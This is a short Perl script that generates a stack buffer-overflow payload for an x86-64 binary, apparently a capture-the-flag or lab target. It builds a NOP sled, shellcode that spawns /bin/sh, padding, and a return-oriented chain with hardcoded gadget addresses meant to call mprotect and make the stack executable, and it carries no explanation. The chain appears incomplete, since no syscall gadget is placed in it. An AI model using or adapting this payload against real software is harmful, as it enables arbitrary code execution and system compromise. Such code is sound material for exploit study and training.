#!/usr/bin/perl

$| = 1;
#$offset = "A"*280
$pop_rax = pack("Q", 0x0000000000451857);
$pop_rdi = pack("Q", 0x00000000004018ca);
$pop_rsi = pack("Q", 0x000000000040f44e);
$pop_rdx = pack("Q", 0x00000000004017cf);
$syscall = pack("Q", 0x000000000041e0d4);
$sys_mprotect = pack("Q", 0xa);
$stack_address = pack("Q", 0x00007ffffffde000);
$stack_size = pack("Q", 0x21000);
$rwx = pack("Q", 0x7);
$nops = "\x90" x 100;
$shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05";
$offset  = "A" x 150;
$return_address = pack("Q", 0x7fffffffe314);

print $nops . $shellcode . $offset . $pop_rax . $sys_mprotect .$pop_rdi . $stack_address . $pop_rsi . $stack_size . $pop_rdx . $rwx  . $return_address;
